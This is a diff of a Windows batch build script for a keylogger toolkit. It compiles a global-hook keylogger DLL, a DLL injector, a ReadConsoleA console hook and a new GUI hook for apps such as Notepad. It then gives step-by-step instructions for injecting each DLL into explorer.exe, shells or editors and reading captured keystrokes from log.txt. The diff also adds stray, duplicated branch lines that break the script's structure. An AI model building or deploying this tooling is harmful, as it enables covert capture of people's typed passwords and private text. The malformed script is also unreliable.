@@ -101,8 +101,8 @@ IF %ERRORLEVEL% NEQ 0 (
 
 echo.
 echo [2/3] Compiling DLL Injector...
-echo Command: cl /EHsc /Fe%INJECTOR_EXE% ReadConsoleA-injector.cpp %INJECTOR_LIBS%
-cl /EHsc /Fe%INJECTOR_EXE% ReadConsoleA-injector.cpp %INJECTOR_LIBS%
+echo Command: cl /EHsc /Fe%INJECTOR_EXE% injector.cpp %INJECTOR_LIBS%
+cl /EHsc /Fe%INJECTOR_EXE% injector.cpp %INJECTOR_LIBS%
 
 IF %ERRORLEVEL% NEQ 0 (
     echo [ERROR] Injector compilation failed!
@@ -112,7 +112,7 @@ IF %ERRORLEVEL% NEQ 0 (
 )
 
 echo.
-echo [3/3] Compiling Inline Hook DLL (optional)...
+echo [3/4] Compiling Inline Hook DLL (console)...
 echo Command: cl /LD /EHsc /Fe%INLINE_HOOK_DLL% inlinehook.cpp %HOOK_LIBS%
 cl /LD /EHsc /Fe%INLINE_HOOK_DLL% inlinehook.cpp %HOOK_LIBS%
 
@@ -124,21 +124,45 @@ IF %ERRORLEVEL% NEQ 0 (
 )
 
 echo.
+echo [4/4] Compiling GUI Hook DLL (GUI applications)...
+echo Command: cl /LD /EHsc /Fe%BUILD_DIR%\GUIhook.dll GUIhook.cpp %HOOK_LIBS%
+cl /LD /EHsc /Fe%BUILD_DIR%\GUIhook.dll GUIhook.cpp %HOOK_LIBS%
+
+IF %ERRORLEVEL% NEQ 0 (
+    echo [ERROR] GUI Hook DLL compilation failed!
+    goto :error
+) ELSE (
+    echo [SUCCESS] GUIhook.dll compiled successfully!
+)
+    goto :error
+) ELSE (
+    echo [SUCCESS] %INLINE_HOOK_DLL% compiled successfully!
+)
+
+echo.
 echo ========================================
 echo           BUILD SUCCESSFUL!
 echo ========================================
 echo.
 echo Generated files in %BUILD_DIR%\ directory:
-echo   - keylogger.dll       (Main keylogger DLL)
+echo   - keylogger.dll       (Main keylogger DLL - global hooks)
 echo   - injector.exe        (DLL injector tool)
-echo   - inlinehook.dll      (ReadConsoleA hook DLL)
+echo   - inlinehook.dll      (ReadConsoleA hook DLL - console apps)
+echo   - GUIhook.dll         (GUI application hook DLL - Notepad, etc.)
 echo.
 echo Usage Instructions:
 echo   1. Get target process PID: 
 echo      Get-Process explorer ^| Select-Object Id
 echo.
-echo   2. Inject keylogger into explorer.exe:
+echo   2. Choose injection method:
+echo      # Global keylogging (all applications):
 echo      %BUILD_DIR%\injector.exe [PID] "%CD%\%BUILD_DIR%\keylogger.dll"
+echo.
+echo      # Console-specific (CMD, PowerShell):
+echo      %BUILD_DIR%\injector.exe [console_PID] "%CD%\%BUILD_DIR%\inlinehook.dll"
+echo.
+echo      # GUI applications (Notepad, text editors):
+echo      %BUILD_DIR%\injector.exe [notepad_PID] "%CD%\%BUILD_DIR%\GUIhook.dll"
 echo.
 echo   3. Check logs in: log.txt
 echo.
